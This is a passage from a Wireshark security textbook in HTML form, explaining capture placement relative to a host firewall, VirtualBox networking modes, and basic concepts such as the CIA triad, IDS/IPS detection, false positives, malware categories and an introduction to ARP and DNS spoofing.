<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section99" ><p class=MsoBodyText  style="margin-top:3.5000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >have a fairly large capture file. Even with great filter finesse, however, no unaccountable connections are leaving the machine. You run Wireshark on a machine connected to a local hub and capture packets going to and from the user&#8217;s machine. To your surprise, <a name="_bookmark206" ></a>you actually see connection initiation attempts going to the user&#8217;s desktop, but nothing in response.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What&#8217;s happening? The Windows Firewall is stopping the outbound connection from finishing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s important to recognize that results differ depending where Wireshark is run. When capturing on a Windows system, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >winpcap </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is doing the capturing, not the application Wireshark. And winpcap performs &#8220;closer&#8221; to the network card than an application layer firewall, like Windows Firewall.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.7000pt;margin-right:10.2000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With regard to packets heading to the user&#8217;s system, you are capturing packets before the firewall sees them. But in regard to any packets</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >that would be blocked by Windows Firewall, those packets won&#8217;t make it to Wireshark (winpcap), no matter where you&#8217;re</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >capturing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In general, it is best practice to run Wireshark from a device on the network, rather than on a system in question. This way, you&#8217;re really seeing what&#8217;s on the wire, versus what you think should be on the wire (and maybe wrongly confirmed).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Networking between Virtual Machines</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There will be times you are capturing packets between multiple virtual machines (VMs), or you are capturing packets between a VM and your host system. Or you will capture packets between a VM and a system outside your private network. In any event, it&#8217;s a good idea to quickly discuss networking options between the home network, VMs, and the Internet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >VirtualBox, which you use to run the virtual machine Kali, allows for a few networking schemes. These options are available when you configure any virtual machine, as shown in<a name="_bookmark207" ></a>&nbsp;</span><span><a href="#_bookmark208" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section100" ><p class=MsoBodyText  style="margin-left:35.7500pt;" ><img width="689"  height="487"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker121987.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark208" ></a><span><a href="#_bookmark207" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox networking options</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Network Address Translation = Just Like Home</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;" ><a name="_bookmark209" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This is the default mode when building a new virtual machine. NAT is set by default, because normally you don&#8217;t want the outside world connecting to your VM. In the same manner your home cable modem provides connectivity, NAT translates the internal (VM&#8217;s) addressing space to the external (host&#8217;s) connection.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >And again like your home cable modem/router, there is added protection over a simple router. Your VM can connect to external addresses transparently, but a system outside cannot initiate a connection to the internal network. You have the option of forwarding a specific port (again, similarly with other NAT configurations). Then again, if you want complete connectivity, there is the Bridged mode option, which is described next.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.9500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Bridged = Outside World</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You built a web server, and you want it reachable from the outside world. Here, you need Bridged mode. Bridged mode differs from NAT</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section101" ><p class=MsoBodyText  style="margin-top:3.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in that the outside system can initiate and reach an internal VM.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This means someone on your host system&#8217;s subnet can initiate traffic and reach your virtual machines. Any security concerns with this?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Absolutely. If you&#8217;re in a coffee shop, library, or otherwise public subnet, you&#8217;ll want to remember how your VM&#8217;s network is configured, lest someone abuse a vulnerable server or tool-rich Kali install.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Internal = All Guests on Same Network</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When you chose Internal Network mode, you&#8217;re saying all the VMs can see each other. There is no connectivity to reach the host system.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If a VM is on a different network, then that too is unreachable. For example, let&#8217;s say you have three machines on the 10.0.0.0/8 network and two machines on a 172.16.0.0/12 network. All of the network adapters are set as Internal. Therefore, the three systems in the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >10.x.x.x space can talk to each other but not to the two systems in the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >172.x.x.x space.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Host-only = A 1:1 Network, Guest, and Host</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:8.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When you choose this network mode for a guest operating system&#8217;s adapter, you permit the guest to communicate with the host, and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >that&#8217;s all. So, let&#8217;s say you&#8217;re testing an application server running on the guest server. Your host could connect as a client. It&#8217;s a small network of two</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >systems.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Each of the network configurations has its purpose, depending on what you&#8217;re setting up, what connectivity you need, and where you want the perimeter to be. From a Wireshark standpoint, it matters most what you want to capture and from where you&#8217;ll capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Security" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark210" ></a>Security</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:12.0500pt;" ><a name="_bookmark211" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As previously mentioned, security professionals come from varied backgrounds. Any of you might specialize in an area. Those with strong networking backgrounds might have gravitated toward firewall management, intrusion detection, or security information and event</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section102" ><p class=MsoBodyText  style="margin-top:3.9500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >management (SIEM). Those with coding expertise might now be exploit researchers or malware analysts. There are penetration testers and incident handlers who came from &#8230; who knows where! The point is, we don&#8217;t expect you to know everything. And you can&#8217;t expect us to skip a topic because it&#8217;s too basic for you. Instead, we look through the lens of working with Wireshark and the rest of this book. We hope you&#8217;ll bear with us.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following is not a simple laundry list of terms and definitions. The following includes a few ideas that, as you read through, will help you see how Wireshark relates to each of them. Each concept is considered in the context of networking and protocol analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >The Security Triad</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Confidentiality, integrity, and availability are the three aspects of information security. This triad comes up early and often in every textbook and certification course. Every security professional knows of the &#8220;C-I-A&#8221; triad or &#8220;A-I-C&#8221; triad.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If it is so well known, why bring it up now? What does it mean in the context of networking and packet analysis? It&#8217;s about data confidentiality. This is a reminder of all the times you read or heard of the relative safety of information on a trusted, internal network. That relative safety is based on the assumption that no one would normally employ a network sniffer. So it goes almost without saying that Wireshark would be available only to personnel authorized to see virtually anything traveling over the network. And, obviously, Wireshark would be used only for circumstances requiring its use.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When it comes to confidentiality, keeping the data secret from prying eyes is the job of encryption. For as long as network traffic is encrypted, it&#8217;s unintelligible to the person reading packets off the wire (or wireless). Unfortunately, that also means those packets are unintelligible to you. The packet headers still have value in terms of troubleshooting, but the packet data will be meaningless.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Intrusion Detection and Prevention Systems</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section103" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Ever played with Snort? Snort is the open-source intrusion detection and prevention software that has been around forever. It is notoriously easy to set up&#8212;and notoriously difficult to apply well. Installing and configuring takes 5% of the work. The other 95% is the tuning or constant adjustments to separate the &#8220;wheat from the chaff.&#8221; If you are one of those security professionals who <a name="_bookmark212" ></a>installs, manages, and tunes IDSs/IPSs, then you appreciate that your tuning never seems to end.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:9.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Briefly, the difference between intrusion detection and intrusion prevention is this: An intrusion detection system (IDS) only alerts that something bad was seen, while the intrusion prevention system (IPS) alerts and then responds to hopefully counter the problem. How does the IDS/IPS know when something is noteworthy? It detects one of two principle ways (or both). The two methods of detection are </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >signature-based </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >anomaly-based</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:8.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Signature-based means it detects based on what it knows about. The IDS has a database of many signatures or patterns to watch out for. If any examined traffic matches the pattern or signature&#8212;boom, an alert! Anomaly-based, on the other hand, triggers because traffic looks suspiciously different compared to what&#8217;s been normal to date. Either method is not failsafe. Any new service or system, whether legitimate or not, creates a new traffic baseline, which may in turn trigger the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >IDS as an</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8220;anomaly.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What about Wireshark? Could it function as an IDS? You know the answer already. Yes, as a signature-based IDS, Wireshark will detect whatever you want to find in the packet contents. Or Wireshark could keep watch over a particular IP address, network, or service. In fact, if you can make a filter for it, Wireshark will let you know when that condition is met on the wire.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >False Positives and False Negatives</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the earlier discussion about intrusion detection, we said the tuning of those systems never seems complete. That&#8217;s because if you&#8217;re not too busy getting rid of false alarms, you&#8217;re in constant fear of missing something legitimately bad. Those two issues come together at the balance of tuning your intrusion detection.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section104" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:8.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >False alarms and missed detection events are also called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >false</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3000pt;font-style:italic;font-size:15.0000pt;" >&nbsp;</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >positives </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >false negatives</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, respectively. The false positive is when a good event gets flagged as bad, while the false negative is when the bad event wasn&#8217;t detected or wrongly</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >detected.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Experience shows that this is one concept that most security professionals understand, but unless it is their daily job, the terms can get confused, so it&#8217;s worth raising here just this once.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Malware</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:12.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We&#8217;re all used to the umbrella term </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >malware</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. A catch-all term, malware represents viruses, worms, Trojans or remote access tools, and basically any other malicious code. In the old days, each of those categories meant specific behavior. For example, viruses would attach to other files and couldn&#8217;t spread without human help, while worms spread unassisted. A Trojan horse was the application that <a name="_bookmark213" ></a>hid itself, possibly including a backdoor or remote access. Rootkits, a special evil, hide within the operating system or firmware to avoid detection.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >These days, malware takes on characteristics of several of the previous categories. Malware, waiting to start as a virus, might then launch a worm to further propagate, planting remote access tools as it spreads. It makes for a far more effective piece of malware, but that much tougher to defend against and recover from.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:7.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Where does this leave us in Wireshark? Wireshark simply reports</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >what it sees on the wire. Unlike in a compromised operating system, a rootkit can&#8217;t manipulate how Wireshark interprets data or restrict what Wireshark presents. Wireshark shows it as it sees it. (Of course, encryption can restrict what you</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interpret.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For malware, if you know what to look for, you will find it in the capture or it&#8217;s not there. The part &#8220;if you know what to look for&#8221; is the trick though, isn&#8217;t it? In the context of intrusion detection, what we&#8217;re talking about is the signature. For example, take a look at<a name="_bookmark214" ></a>&nbsp;</span><span><a href="#_bookmark215" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, where some signature code is more than obvious.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section105" ><p class=MsoBodyText ><img width="779"  height="536"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker130994.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark215" ></a><span><a href="#_bookmark214" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-3:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Malware signature code</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The &#8220;knowing what to look for&#8221; might be a known string of text or ASCII, a peculiar source or destination port, calling &#8220;home&#8221; to a certain IP address range&#8212;all are example signs that would help you build the right display filter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Spoofing and Poisoning</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><a name="_bookmark216" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When I go to the grocery store, I sometimes set up a table in front of the deli and pretend I work there. I wear my apron and people just trust me because I say I&#8217;m the deli guy. When people want meat or cheese, I turn and grab it from the real deli counter. No one is the wiser, right?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >That&#8217;s what happens in spoofing or poisoning. An imposter gets in a position to intercept requests. Unsuspecting customers come with legitimate requests or are told in advance who to ask. The imposter, now acting as &#8220;man in the middle,&#8221; services the requests. What to do</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section106" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >with those requests is up to the imposter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The danger is obvious. The skill involved is minimal. With the plethora of tools available, complete with fool-proof GUIs, even the non- technical, disgruntled employee can spoof service requests for fun or profit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:7.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What&#8217;s the difference between spoofing and poisoning? Semantics really, but if anything, the order of events. Spoofing is answering a good request with a malicious response, while poisoning is sending out the bad information in advance. The intent of poisoning in advance is the redirect is then cached, saving the need to send a request to get intercepted.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What protocols become the deli counter? Two big, easy targets: Address Resolution Protocol (ARP) and Domain Name System (DNS). To refresh, ARP answers what layer 2 MAC address is associated with a known IP address. Similarly, DNS resolution answers 